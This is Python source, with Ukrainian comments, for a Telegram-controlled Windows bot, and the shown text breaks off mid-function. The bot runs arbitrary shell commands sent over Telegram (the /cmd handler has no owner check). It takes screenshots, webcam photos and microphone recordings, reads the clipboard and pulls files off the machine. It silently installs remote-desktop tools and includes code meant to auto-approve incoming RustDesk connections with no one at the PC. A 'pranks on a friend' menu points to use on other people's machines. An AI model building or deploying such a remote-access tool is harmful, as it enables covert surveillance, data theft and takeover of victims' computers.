import telebot
from telebot import types
import platform
import os
import psutil
import pyautogui
import cv2 
import numpy as np
import ctypes
import threading
import webbrowser
import subprocess
import time
import datetime
import io
import re
import json
import shutil
import tempfile
import urllib.request
from PIL import Image

# --- ДОДАТКОВІ МОДУЛІ ДЛЯ НОВИХ ФУНКЦІЙ ---
import pyttsx3
import sounddevice as sd
from scipy.io.wavfile import write
import pyperclip

time.sleep(15) 

MY_ID = "7678008217" # Твій ID
PC_NAME = platform.node()

# --- ВЕРСІЯ 3.0 (RUSTDESK: ПІДТВЕРДЖЕННЯ ВХІДНИХ ПІДКЛЮЧЕНЬ У TELEGRAM) ---
BOT_VERSION = "3.0 (RustDesk: підтвердження підключень у Telegram)"

# Папка бота за дефолтом
botDir = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'ControlPC')
if not os.path.exists(botDir): os.makedirs(botDir)

# --- БЕЗПЕЧНЕ ЧИТАННЯ ТОКЕНА ---
token_file = os.path.join(botDir, "token.txt")

try:
    with open(token_file, "r", encoding="utf-8-sig") as f:
        TOKEN = f.read().strip()
except FileNotFoundError:
    with open(token_file, "w", encoding="utf-8") as f:
        f.write("ВСТАВ_СВІЙ_ТОКЕН_СЮДИ")
    os._exit(0)

bot = telebot.TeleBot(TOKEN)

# ==========================================
# 1. МЕНЮ ТА КНОПКИ
# ==========================================
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🎮 Медіа", "⚙️ Система")
    markup.row("📂 Файли", "✨ Трішки магії")
    markup.add("👁 Інфо про ПК")
    return markup

def get_media_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🔊 Гучність +", "🔉 Гучність -", "🔇 Мут")
    markup.row("⏯ Плей/Пауза", "🖥 Скріншот")
    markup.add("🔙 Головне меню")
    return markup

def get_system_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📝 Процеси", "📸 Фото з камери")
    markup.row("📋 Буфер обміну", "🖥 Дистанційне керування")
    markup.row("📥 Встановити додаток")
    markup.row("🔔 RustDesk захист")
    markup.row("🔄 Перезапустити бота")
    markup.row("❌ Вимкнути ПК", "🔄 Перезавантажити")
    markup.add("🔙 Головне меню")
    return markup

# ІНЛАЙН-МЕНЮ ВСТАНОВЛЕННЯ ПРОГРАМ
def get_install_menu():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🔴 RustDesk", callback_data="install_rustdesk"),
        types.InlineKeyboardButton("🔵 AnyDesk", callback_data="install_anydesk"),
        types.InlineKeyboardButton("🟦 TeamViewer", callback_data="install_teamviewer"),
        types.InlineKeyboardButton("🌐 Google Chrome", callback_data="install_chrome"),
        types.InlineKeyboardButton("📄 Telegram Desktop", callback_data="install_telegram"),
        types.InlineKeyboardButton("🔙 Назад в меню", callback_data="install_back"),
    )
    return markup

def get_files_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📥 Скачати з ПК", "📤 Закинути на ПК")
    markup.add("🔙 Головне меню")
    return markup

def get_magic_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🔒 Заблокувати екран", "⚠️ Вивести текст")
    markup.row("🌐 Відкрити сайт", "🗣 Озвучити текст")
    markup.row("🎙 Мікрофон", "⌨️ Друкар (Текст)")
    markup.row("🏓 Пінг", "🎭 Розіграші") # <-- Додали перехід у меню приколів
    markup.add("🔙 Головне меню") 
    return markup

# НОВЕ МЕНЮ ДЛЯ ЖАРТІВ НАД ДРУГОМ
def get_pranks_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🟢 Ефект Матриці", "🔊 Комп'ютер говорить")
    markup.row("🚨 Самознищення", "🛑 Скасувати вимкнення")
    markup.row("🎵 Рикролл")
    markup.add("🔙 Назад до магії")
    return markup

# ==========================================
# 2. СТАРТ ТА ОПОВІЩЕННЯ
# ==========================================
try:
    bot.send_message(MY_ID, f"🟢 Система `[{PC_NAME}]` готова!\n🤖 Версія: {BOT_VERSION}", parse_mode="Markdown", reply_markup=get_main_menu())
except:
    pass

# --- КОМАНДА CMD ---
@bot.message_handler(commands=['cmd'])
def run_command(message):
    cmd_text = message.text.replace('/cmd ', '')
    if cmd_text == '/cmd' or not cmd_text:
        bot.reply_to(message, "Приклад: /cmd dir")
        return
    try:
        final_output = subprocess.getoutput(cmd_text)
        if len(final_output) > 3500:
            final_output = final_output[:3500] + "...[Cut]"
        n = chr(10)
        code_tag = "```"
        full_message = "Результат:" + n + code_tag + n + str(final_output) + n + code_tag
        bot.send_message(message.chat.id, full_message, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, "Помилка: " + str(e))
        
# --- ДЕФОЛТНИЙ ПРИЙОМ ФАЙЛІВ ---
@bot.message_handler(content_types=['document', 'photo'])
def handle_upload(message):
    try:
        upload_path = os.path.join(botDir, "Downloads")
        if not os.path.exists(upload_path): os.makedirs(upload_path)
        file_info = bot.get_file(message.document.file_id if message.document else message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = message.document.file_name if message.document else f"photo_{int(time.time())}.jpg"
        src = os.path.join(upload_path, file_name)
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.reply_to(message, f"✅ Файл збережено в дефолтну папку:\n`{src}`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Помилка завантаження: {e}")        

@bot.message_handler(commands=['start'])
def start_command(message):
    if str(message.chat.id) == str(MY_ID):
        bot.send_message(MY_ID, f"Керування: {PC_NAME}", reply_markup=get_main_menu())

# ==========================================
# 3. ДОДАТКОВІ ФУНКЦІЇ БОТА
# ==========================================
def process_download(message):
    if message.text == "🔙 Головне меню":
        bot.send_message(MY_ID, "Відміна.", reply_markup=get_main_menu())
        return
    path = message.text.strip()
    try:
        if os.path.exists(path):
            if os.path.isdir(path):
                bot.send_message(MY_ID, "❌ Це папка. Вкажи шлях до файлу.")
                return
            file_size_mb = os.path.getsize(path) / (1024 * 1024)
            if file_size_mb > 49:
                bot.send_message(MY_ID, f"❌ Файл занадто великий ({file_size_mb:.1f} МБ). Ліміт Telegram - 50 МБ.")
                return
            bot.send_message(MY_ID, f"⏳ Завантажую файл ({file_size_mb:.1f} МБ)...")
            with open(path, "rb") as doc:
                bot.send_document(MY_ID, doc)
        else:
            bot.send_message(MY_ID, f"❌ Файл не знайдено за шляхом:\n`{path}`", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(MY_ID, f"❌ Помилка: {str(e)}")

def process_alert(message):
    if message.text == "🔙 Головне меню": return
    text = message.text
    def show_msg():
        ctypes.windll.user32.MessageBoxW(0, text, "Повідомлення Системи", 0x40000 | 0x30)
    threading.Thread(target=show_msg).start()
    bot.send_message(MY_ID, "✅ Повідомлення відкрито на екрані ПК!")

def process_website(message):
    if message.text == "🔙 Головне меню": return
    url = message.text.strip()
    if not url.startswith("http"):
        url = "https://" + url
    webbrowser.open(url)
    bot.send_message(MY_ID, f"✅ Відкрито сайт: {url}")

def process_upload_path(message):
    if message.text == "🔙 Головне меню":
        bot.send_message(MY_ID, "Відміна.", reply_markup=get_main_menu())
        return
    target_path = message.text.strip()
    if target_path.lower() == "дефолт":
        target_path = os.path.join(botDir, "Downloads")
        
    if not os.path.exists(target_path):
        try:
            os.makedirs(target_path)
        except Exception as e:
            bot.send_message(MY_ID, f"❌ Не вдалося створити або знайти таку папку: {e}. Спробуй ще раз.")
            return
            
    msg_prompt = bot.send_message(MY_ID, f"📁 Папку вибрано: `{target_path}`\n\nТепер надішли мені **файл або фото**, і я збережу його саме туди.", parse_mode="Markdown")
    bot.register_next_step_handler(msg_prompt, process_upload_file, target_path)

def process_upload_file(message, target_path):
    if message.text == "🔙 Головне меню":
        bot.send_message(MY_ID, "Відміна.", reply_markup=get_main_menu())
        return
    if not (message.document or message.photo):
        bot.send_message(MY_ID, "❌ Це не файл і не фото. Процес скасовано.", reply_markup=get_main_menu())
        return
    try:
        file_info = bot.get_file(message.document.file_id if message.document else message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = message.document.file_name if message.document else f"photo_{int(time.time())}.jpg"
        src = os.path.join(target_path, file_name)
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.reply_to(message, f"✅ Файл успішно збережено в:\n`{src}`", parse_mode="Markdown", reply_markup=get_main_menu())
    except Exception as e:
        bot.reply_to(message, f"❌ Помилка збереження: {e}", reply_markup=get_main_menu())

def process_typing(message):
    if message.text == "🔙 Головне меню":
        bot.send_message(MY_ID, "Відміна.", reply_markup=get_main_menu())
        return
    text = message.text
    try:
        old_clipboard = pyperclip.paste()
        pyperclip.copy(text)
        pyautogui.hotkey('ctrl', 'v')
        time.sleep(0.1)
        pyperclip.copy(old_clipboard)
        bot.send_message(MY_ID, "✅ Текст успішно введено на клавіатурі ПК!")
    except Exception as e:
        bot.send_message(MY_ID, f"❌ Помилка введення тексту: {e}")

def process_tts_text(message):
    if message.text == "🔙 Головне меню":
        bot.send_message(MY_ID, "Відміна.", reply_markup=get_main_menu())
        return
    text = message.text
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🐢 Повільно", "🚶 Нормально", "🚀 Швидко")
    markup.add("🔙 Головне меню")
    
    msg_prompt = bot.send_message(MY_ID, "Обери швидкість озвучування:", reply_markup=markup)
    bot.register_next_step_handler(msg_prompt, process_tts_speak, text)

def process_tts_speak(message, text):
    if message.text == "🔙 Головне меню":
        bot.send_message(MY_ID, "Відміна.", reply_markup=get_main_menu())
        return
        
    speed_choice = message.text
    rate = 145
    if speed_choice == "🐢 Повільно": rate = 115
    elif speed_choice == "🚀 Швидко": rate = 185
    
    bot.send_message(MY_ID, "🗣 Озвучую на комп'ютері...", reply_markup=get_magic_menu())
    
    def speak_thread():
        try:
            engine = pyttsx3.init()
            engine.setProperty('rate', rate)
            voices = engine.getProperty('voices')
            cyrillic_voice = None
            for voice in voices:
                v_name = voice.name.lower()
                v_id = voice.id.lower()
                if "ukrainian" in v_name or "uk" in v_id or "anatol" in v_name or "lesya" in v_name:
                    cyrillic_voice = voice.id
                    break
            if not cyrillic_voice:
                for voice in voices:
                    v_name = voice.name.lower()
                    v_id = voice.id.lower()
                    if "russian" in v_name or "ru" in v_id or "elena" in v_name or "irina" in v_name:
                        cyrillic_voice = voice.id
                        break
            if cyrillic_voice:
                engine.setProperty('voice', cyrillic_voice)
                
            time.sleep(0.8)
            engine.say(text)
            engine.runAndWait()
            bot.send_message(MY_ID, "✅ Озвучено успішно!")
        except Exception as e:
            bot.send_message(MY_ID, f"❌ Помилка звукового рушія: {e}")
            
    threading.Thread(target=speak_thread).start()

def record_audio_func():
    try:
        seconds = 10
        fs = 44100
        output_file = os.path.join(botDir, "output.wav")
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(output_file, fs, myrecording)
        with open(output_file, 'rb') as audio:
            bot.send_voice(MY_ID, audio)
        os.remove(output_file)
    except Exception as e:
        bot.send_message(MY_ID, f"❌ Помилка запису: {e}")

# ==========================================
# 3.1 ШВИДКИЙ СКРІНШОТ (JPEG У ПАМ'ЯТІ)
# ==========================================
SCREEN_MAX_WIDTH = 1920        # макс. ширина скріншота (менше = швидше відправка)
SCREEN_MAX_SIZE_KB = 280       # цільовий розмір JPEG (тримаємось ліміту 200-300 КБ)
SCREEN_JPEG_QUALITY = 75       # стартова якість JPEG
PIL_LANCZOS = getattr(getattr(Image, "Resampling", Image), "LANCZOS", 1)

def capture_screen_io(max_width=SCREEN_MAX_WIDTH, max_size_kb=SCREEN_MAX_SIZE_KB, quality=SCREEN_JPEG_QUALITY):
    """Робить скріншот відразу в пам'ять (io.BytesIO), без запису на диск.

    Повертає готовий до відправки JPEG-буфер розміром до max_size_kb.
    """
    shot = pyautogui.screenshot()          # PIL.Image у пам'яті
    if shot.mode != "RGB":
        shot = shot.convert("RGB")

    # Зменшуємо роздільну здатність, якщо екран завеликий
    if max_width and shot.width > max_width:
        new_height = max(1, int(shot.height * max_width / shot.width))
        shot = shot.resize((max_width, new_height), PIL_LANCZOS)

    buffer = io.BytesIO()
    shot.save(buffer, format="JPEG", quality=quality, optimize=True)

    # Якщо файл все ще завеликий - знижуємо якість (до 35), а далі роздільну здатність
    while buffer.tell() > max_size_kb * 1024 and (quality > 35 or shot.width > 640):
        if quality > 35:
            quality -= 10
        else:
            shot = shot.resize((max(1, int(shot.width * 0.8)), max(1, int(shot.height * 0.8))), PIL_LANCZOS)
        buffer = io.BytesIO()
        shot.save(buffer, format="JPEG", quality=quality, optimize=True)

    buffer.seek(0)
    buffer.name = "screen.jpg"             # telebot визначає формат за іменем
    return buffer

# ==========================================
# 3.2 ВІДДАЛЕНИЙ ДОСТУП (RustDesk / AnyDesk / TeamViewer)
# ==========================================
CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0)

REMOTE_PROGRAMS = [
    {
        "name": "RustDesk",
        "process": "rustdesk.exe",
        "paths": [
            os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "RustDesk", "rustdesk.exe"),
            os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "RustDesk", "rustdesk.exe"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "RustDesk", "rustdesk.exe"),
            os.path.join(os.environ.get("APPDATA", ""), "RustDesk", "rustdesk.exe"),
            os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "RustDesk", "rustdesk.exe"),
        ],
        "id_args": ["--get-id"],
        "config_path": os.path.join(os.environ.get("APPDATA", ""), "RustDesk", "config", "RustDesk.toml"),
        "config_key": "id",
    },
    {
        "name": "AnyDesk",
        "process": "AnyDesk.exe",
        "paths": [
            os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "AnyDesk", "AnyDesk.exe"),
            os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "AnyDesk", "AnyDesk.exe"),
            os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "AnyDesk", "AnyDesk.exe"),
            os.path.join(os.environ.get("APPDATA", ""), "AnyDesk", "AnyDesk.exe"),
        ],
        "id_args": ["--get-id"],
        "config_path": os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "AnyDesk", "system.conf"),
        "config_key": "ad.anynet.id",
    },
    {
        "name": "TeamViewer",
        "process": "TeamViewer.exe",
        "paths": [
            os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "TeamViewer", "TeamViewer.exe"),
            os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "TeamViewer", "TeamViewer.exe"),
        ],
        "id_args": None,        # у TeamViewer немає CLI для ID - беремо з реєстру
        "config_path": None,
        "config_key": None,
        "from_registry": True,
    },
]

def _remote_find_process(process_name):
    """Шукає запущений процес за іменем. Повертає шлях до exe або None."""
    for proc in psutil.process_iter(["name", "exe"]):
        try:
            info = proc.info
            if (info.get("name") or "").lower() == process_name.lower():
                return info.get("exe") or process_name
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return None

def _remote_find_exe(prog):
    """Повертає (шлях_до_exe, чи_вже_запущена)."""
    running_exe = _remote_find_process(prog["process"])
    for path in prog["paths"]:
        if path and os.path.exists(path):
            return path, running_exe is not None
    found = shutil.which(prog["process"])
    if found:
        return found, running_exe is not None
    if running_exe and os.path.exists(running_exe):
        return running_exe, True
    return None, running_exe is not None

def _remote_normalize_id(raw):
    """Прибирає зайві символи з ID (лапки, пробіли, 'ID:')."""
    raw = (raw or "").strip().strip("'\"")
    digits = re.sub(r"\D", "", raw)
    return digits if len(digits) >= 5 else raw

def _remote_read_config_id(prog):
    """Читає ID з конфігураційного файлу програми (RustDesk.toml / system.conf)."""
    path, key = prog.get("config_path"), prog.get("config_key")
    if not path or not key or not os.path.exists(path):
        return ""
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line.lower().startswith(key.lower()) and "=" in line:
                    value = line.split("=", 1)[1].strip().strip("'\"")
                    if value:
                        return value
    except Exception:
        pass
    return ""

def _remote_read_teamviewer_id():
    """Бере TeamViewer ID з реєстру Windows (ClientID)."""
    try:
        import winreg
    except ImportError:
        return ""
    locations = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\TeamViewer"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\TeamViewer"),
        (winreg.HKEY_CURRENT_USER, r"Software\TeamViewer"),
    ]
    for root, path in locations:
        try:
            with winreg.OpenKey(root, path) as reg_key:
                client_id, _ = winreg.QueryValueEx(reg_key, "ClientID")
            digits = str(int(client_id)).zfill(10)
            return f"{digits[:3]} {digits[3:6]} {digits[6:]}"
        except (OSError, ValueError, TypeError):
            continue
    return ""

def _remote_get_id(prog, exe):
    """ID сесії: спершу через CLI (--get-id), далі з конфігу або реєстру."""
    if exe and prog.get("id_args") and os.path.exists(exe):
        try:
            result = subprocess.run([exe] + prog["id_args"], capture_output=True, text=True,
                                    timeout=8, creationflags=CREATE_NO_WINDOW)
            lines = [ln.strip() for ln in (result.stdout or "").splitlines() if ln.strip()]
            for line in reversed(lines):
                digits = re.sub(r"\D", "", line)
                if len(digits) >= 5:
                    return digits
            if lines:
                return _remote_normalize_id(lines[-1])
        except Exception:
            pass
    if prog.get("from_registry"):
        return _remote_read_teamviewer_id()
    return _remote_normalize_id(_remote_read_config_id(prog))

def remote_desktop_worker():
    """Перевіряє/запускає програму віддаленого доступу і надсилає ID сесії в Telegram."""
    try:
        found = None
        for prog in REMOTE_PROGRAMS:
            exe, was_running = _remote_find_exe(prog)
            if exe:
                found = (prog, exe, was_running)
                break

        if not found:
            bot.send_message(
                MY_ID,
                "❌ Не знайдено жодної програми для віддаленого керування.\n\n"
                "Встанови RustDesk (rustdesk.com) або AnyDesk (anydesk.com) на цей ПК "
                "і натисни кнопку ще раз.",
                reply_markup=get_system_menu())
            return

        prog, exe, was_running = found

        if not was_running:
            bot.send_message(MY_ID, f"🚀 Запускаю {prog['name']}...")
            try:
                subprocess.Popen([exe], creationflags=CREATE_NO_WINDOW)
            except Exception:
                os.startfile(exe)
            time.sleep(4)   # даємо програмі час підняти службу та згенерувати ID

        remote_id = ""
        for _ in range(4):
            remote_id = _remote_get_id(prog, exe)
            if remote_id:
                break
            time.sleep(3)

        status = "вже була запущена" if was_running else "щойно запущена"

        if remote_id:
            text = (
                f"🖥 *Дистанційне керування готове!*\n\n"
                f"📦 Програма: {prog['name']} ({status})\n"
                f"🆔 ID сесії: `{remote_id}`\n\n"
                f"📱 Як підключитись з телефону:\n"
                f"1. Встанови {prog['name']} на телефон.\n"
                f"2. Введи ID `{remote_id}`.\n"
                f"3. Введи пароль із вікна {prog['name']} на ПК.\n\n"
                f"💡 Порада: увімкни постійний пароль у налаштуваннях {prog['name']} (Security), "
                f"щоб підключатися без підтвердження на ПК."
            )
        else:
            text = (
                f"🖥 {prog['name']} ({status}), але ID не вдалося прочитати автоматично.\n\n"
                f"👀 Подивись ID у вікні програми на ПК і введи його на телефоні."
            )

        try:
            bot.send_message(MY_ID, text, parse_mode="Markdown", reply_markup=get_system_menu())
        except Exception:
            bot.send_message(MY_ID, text, reply_markup=get_system_menu())
    except Exception as e:
        bot.send_message(MY_ID, f"❌ Помилка віддаленого доступу: {e}")

# ==========================================
# 3.3 АВТОМАТИЧНЕ ВСТАНОВЛЕННЯ ДОДАТКІВ (WINGET + ТИХИЙ ІНСТАЛЯТОР)
# ==========================================
TEMP_DIR = tempfile.gettempdir()

# Куди AnyDesk ставиться при тихому встановленні
ANYDESK_DIR = os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "AnyDesk")

# Реєстр програм: winget ID + резервне посилання на інсталятор + ключі тихого запуску
INSTALL_PROGRAMS = {
    "rustdesk": {
        "name": "RustDesk",
        "winget_id": "RustDesk.RustDesk",
        # RustDesk прибрали з репозиторію winget, тому спершу качаємо інсталятор напряму
        "prefer": "installer",
        "url": "https://api.github.com/repos/rustdesk/rustdesk/releases/latest",
        "url_resolver": "rustdesk",          # посилання шукаємо через GitHub API
        "installer": "rustdesk_setup.exe",
        "silent_args": ["--silent-install"],
    },
    "anydesk": {
        "name": "AnyDesk",
        "winget_id": "AnyDesk.AnyDesk",
        "url": "https://download.anydesk.com/AnyDesk.exe",
        "installer": "anydesk_setup.exe",
        "silent_args": ["--install", ANYDESK_DIR, "--silent"],
    },
    "teamviewer": {
        "name": "TeamViewer",
        "winget_id": "TeamViewer.TeamViewer",
        "url": "https://download.teamviewer.com/download/TeamViewer_Setup_x64.exe",
        "installer": "teamviewer_setup.exe",
        "silent_args": ["/S"],
    },
    "chrome": {
        "name": "Google Chrome",
        "winget_id": "Google.Chrome",
        "url": "https://dl.google.com/chrome/install/latest/chrome_installer.exe",
        "installer": "chrome_installer.exe",
        "silent_args": ["/silent", "/install"],
    },
    "telegram": {
        "name": "Telegram Desktop",
        "winget_id": "Telegram.TelegramDesktop",
        "url": "https://telegram.org/dl/desktop/win64",
        "installer": "telegram_setup.exe",
        "silent_args": ["/VERYSILENT", "/NORESTART", "/SUPPRESSMSGBOXES", "/NOCANCEL"],
    },
}

INSTALL_LOCK = threading.Lock()
INSTALLING_NOW = set()      # які програми вже встановлюються (захист від подвійного кліку)

def _install_find_winget():
    """Шукає winget.exe у PATH та стандартних папках Windows."""
    candidates = [shutil.which("winget")]
    local_appdata = os.environ.get("LOCALAPPDATA", "")
    if local_appdata:
        candidates.append(os.path.join(local_appdata, "Microsoft", "WindowsApps", "winget.exe"))
    program_files = os.environ.get("ProgramFiles", r"C:\Program Files")
    candidates.append(os.path.join(program_files, "WindowsApps",
                                   "Microsoft.DesktopAppInstaller_8wekyb3d8bbwe", "winget.exe"))
    for path in candidates:
        if path and os.path.exists(path):
            return path
    return None

def _install_rustdesk_url():
    """Бере пряме посилання на свіжий rustdesk-*-x86_64.exe через GitHub API."""
    try:
        request = urllib.request.Request(INSTALL_PROGRAMS["rustdesk"]["url"],
                                         headers={"User-Agent": "ControlPC-Bot"})
        with urllib.request.urlopen(request, timeout=20) as response:
            data = json.loads(response.read().decode("utf-8", "ignore"))
        for asset in data.get("assets", []):
            if (asset.get("name") or "").lower().endswith("x86_64.exe"):
                return asset.get("browser_download_url", "")
    except Exception:
        pass
    return ""

def _install_download(url, filename):
    """Завантажує інсталятор у папку Temp (аналог Invoke-WebRequest -OutFile)."""
    target = os.path.join(TEMP_DIR, filename)
    request = urllib.request.Request(url, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
    with urllib.request.urlopen(request, timeout=120) as response, open(target, "wb") as out_file:
        shutil.copyfileobj(response, out_file)
    return target

def _install_run(cmd, timeout):
    """Запускає команду без вікна консолі. Повертає (код_виходу, вивід)."""
    result = subprocess.run(cmd, capture_output=True, text=True, errors="ignore",
                            timeout=timeout, creationflags=CREATE_NO_WINDOW)
    output = f"{result.stdout or ''}{result.stderr or ''}".strip()
    return result.returncode, output

def _install_by_winget(prog):
    """Тихе встановлення через winget."""
    winget_exe = _install_find_winget()
    if not winget_exe:
        return False, "winget не знайдено в системі"
    cmd = [winget_exe, "install", "--id", prog["winget_id"], "-e", "--silent",
           "--accept-source-agreements", "--accept-package-agreements"]
    code, output = _install_run(cmd, timeout=900)
    lowered = output.lower()
    if code == 0 or "already installed" in lowered or "вже встановлено" in lowered:
        return True, output
    return False, output or f"winget код виходу: {code}"

def _install_by_installer(prog):
    """Тихе встановлення напряму з інсталятора (качаємо в Temp і запускаємо)."""
    url = prog["url"]
    if prog.get("url_resolver") == "rustdesk":
        url = _install_rustdesk_url() or url
    installer = _install_download(url, prog["installer"])
    try:
        code, output = _install_run([installer] + prog["silent_args"], timeout=1800)
    finally:
        try:
            os.remove(installer)        # прибираємо за собою Temp
        except OSError:
            pass
    if code in (0, 3010):               # 3010 = успішно, потрібен перезапуск
        return True, output
    return False, output or f"код інсталятора: {code}"

def install_app_worker(code):
    """Фонове встановлення програми: winget або тихий інсталятор (з резервною спробою)."""
    prog = INSTALL_PROGRAMS.get(code)
    if not prog:
        return
    name = prog["name"]
    try:
        # Порядок спроб: за замовчуванням winget -> інсталятор, для RustDesk - навпаки
        attempts = ["installer", "winget"] if prog.get("prefer") == "installer" else ["winget", "installer"]
        success, details = False, ""

        for attempt in attempts:
            try:
                if attempt == "winget":
                    success, attempt_details = _install_by_winget(prog)
                else:
                    success, attempt_details = _install_by_installer(prog)
                if attempt_details:
                    details = attempt_details
            except Exception as e:
                success, details = False, f"{attempt}: {e}"
            if success:
                break

        if success:
            bot.send_message(MY_ID, f"✅ {name} успішно встановлено!",
                             reply_markup=get_system_menu())
        else:
            tail = (details or "").strip()
            if len(tail) > 500:
                tail = "..." + tail[-500:]
            text = f"❌ Помилка при встановленні {name}."
            if tail:
                text += f"\n\n🔍 Деталі:\n{tail}"
            bot.send_message(MY_ID, text, reply_markup=get_system_menu())
    except Exception as e:
        bot.send_message(MY_ID, f"❌ Помилка при встановленні {name}.\n\n🔍 Деталі:\n{e}",
                         reply_markup=get_system_menu())
    finally:
        with INSTALL_LOCK:
            INSTALLING_NOW.discard(code)

@bot.callback_query_handler(func=lambda call: str(call.data or "").startswith("install_"))
def handle_install_callback(call):
    """Обробляє натискання інлайн-кнопок меню встановлення."""
    if str(call.from_user.id) != str(MY_ID):
        bot.answer_callback_query(call.id, "⛔ Доступ заборонено")
        return

    code = (call.data or "")[len("install_"):]

    if code == "back":
        bot.answer_callback_query(call.id, "Повертаюсь у меню")
        try:
            bot.edit_message_reply_markup(MY_ID, call.message.message_id, reply_markup=None)
        except Exception:
            pass
        bot.send_message(MY_ID, "Головне меню:", reply_markup=get_main_menu())
        return

    prog = INSTALL_PROGRAMS.get(code)
    if not prog:
        bot.answer_callback_query(call.id, "❓ Невідома програма")
        return

    name = prog["name"]
    with INSTALL_LOCK:
        already_running = code in INSTALLING_NOW
        if not already_running:
            INSTALLING_NOW.add(code)

    if already_running:
        bot.answer_callback_query(call.id, f"⏳ {name} вже встановлюється")
        return

    bot.answer_callback_query(call.id, f"📥 Стартую встановлення {name}")
    bot.send_message(MY_ID, f"⏳ Почалося встановлення {name}... Зачекайте 1-2 хвилини.",
                     reply_markup=get_system_menu())
    threading.Thread(target=install_app_worker, args=(code,), daemon=True).start()

# ==========================================
# 3.4 RUSTDESK: ІНТЕРАКТИВНЕ ПІДТВЕРДЖЕННЯ ВХІДНИХ ПІДКЛЮЧЕНЬ
# ==========================================
# Ідея: бот стежить за появою вікна-запиту RustDesk (або нового з'єднання) і надсилає
# в Telegram фото вікна з інлайн-кнопками «Прийняти» / «Відхилити».
# «Прийняти» = бот сам виводить вікно RustDesk на передній план, знаходить основну
# (акцентну) кнопку підтвердження через cv2 і натискає її за тебе - без твоєї участі.
RS_PROCESS_NAME = "rustdesk.exe"
RS_POLL_INTERVAL = 2.0          # як часто перевіряємо появу запиту на ПК, сек
RS_REPROMPT_AFTER = 180         # якщо запит «висить» довго - нагадуємо повторно, сек
RS_MIN_WINDOW_AREA = 100 * 70   # дрібні службові вікна (IME, 16x16) не рахуємо запитом
RS_IGNORE_CLASSES = {"ime", "tao thread event target", "msctfime ui", "tooltips_class32"}
RS_MAIN_CLASSES = {"tray_icon_app"}   # головне вікно RustDesk саме по собі - ще не запит
RS_CONFIRM_ENABLED = True       # чи надсилати запити в Telegram (перемикається кнопкою)

RS_PROMPT_LOCK = threading.Lock()
RS_PENDING = {}                 # hwnd запиту -> час останнього повідомлення
RS_KNOWN_ENDPOINTS = set()      # уже відомі з'єднання RustDesk (щоб не спамити)
RS_CV_LOCK = threading.Lock()
RS_CV_CACHE = {"hwnd": None, "time": 0.0, "result": False}

class _RS_RECT(ctypes.Structure):
    """Прямокутник вікна (локальна копія RECT, щоб не тягнути ctypes.wintypes)."""
    _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
                ("right", ctypes.c_long), ("bottom", ctypes.c_long)]

def _rs_log(text):
    """Пише події RustDesk у загальний лог бота (bot_errors.txt)."""
    try:
        with open(os.path.join(botDir, "bot_errors.txt"), "a", encoding="utf-8") as f:
            f.write(f"[RustDesk] {datetime.datetime.now()}: {text}\n")
    except Exception:
        pass

def _rs_pids():
    """PID-и всіх запущених процесів RustDesk."""
    pids = set()
    for proc in psutil.process_iter(["name", "pid"]):
        try:
            if (proc.info.get("name") or "").lower() == RS_PROCESS_NAME:
                pids.add(proc.info["pid"])
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return pids

def _rs_windows():
    """Верхньорівневі вікна RustDesk: hwnd -> (заголовок, клас, (l, t, r, b), видиме)."""
    pids = _rs_pids()
    if not pids:
        return {}
    user32 = ctypes.windll.user32
    windows = {}

    def _callback(hwnd, _lparam):
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        if pid.value in pids:
            length = user32.GetWindowTextLengthW(hwnd)
            title = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, title, length + 1)
            class_name = ctypes.create_unicode_buffer(256)
            user32.GetClassNameW(hwnd, class_name, 256)
            rect = _RS_RECT()
            user32.GetWindowRect(hwnd, ctypes.byref(rect))
            windows[int(hwnd)] = (title.value, class_name.value,
                                  (rect.left, rect.top, rect.right, rect.bottom),
                                  bool(user32.IsWindowVisible(hwnd)))
        return True

    enum_proc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    user32.EnumWindows(enum_proc(_callback), 0)
    return windows

def _rs_area(info):
